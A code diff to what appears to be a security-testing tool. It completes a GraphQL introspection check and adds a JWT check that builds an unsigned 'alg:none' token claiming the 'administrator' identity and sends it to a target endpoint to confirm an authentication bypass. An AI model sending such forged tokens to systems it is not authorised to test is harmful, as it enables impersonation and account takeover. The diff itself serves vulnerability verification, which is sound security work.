@@ -2,6 +2,8 @@
 by hypothesis class without a hardcoded branch (Open/Closed)."""
 from __future__ import annotations
 
+import base64
+import json
 import re
 import secrets
 from dataclasses import dataclass, field
@@ -557,4 +559,31 @@ def check_graphql(session, hyp, ev_dir, ctx):
     if "introspection" in body.lower() or resp.status in (400, 403):
         return CheckResult("false-positive", endpoint, files=files,
                            false_positive_reason="introspection is disabled or rejected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+def _jwt_segment(obj):
+    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()
+
+
+@register("JWT")
+def check_jwt(session, hyp, ev_dir, ctx):
+    """JWT alg:none: a forged token with header {"alg":"none"} and no signature is accepted,
+    letting an attacker assert any identity. Confirm by claiming 'administrator' with an
+    unsigned token; a rejection is a false positive."""
+    endpoint = hyp["endpoint"]
+    forged = (_jwt_segment({"alg": "none", "typ": "JWT"}) + "." +
+              _jwt_segment({"user": "administrator", "role": "admin"}) + ".")
+    resp = session.get(endpoint, headers={"Authorization": f"Bearer {forged}"})
+    files = save_evidence(ev_dir, "alg-none", resp)
+    body = resp.body or ""
+
+    if resp.status == 200 and "administrator" in body:
+        return CheckResult("confirmed", endpoint, "high", f"Bearer {forged}",
+                           "An unsigned alg:none token asserting 'administrator' was "
+                           "accepted; identity can be forged without the signing key.",
+                           files=files)
+    if resp.status in (401, 403):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="unsigned (alg:none) token was rejected")
     return CheckResult("unconfirmed", endpoint, files=files)
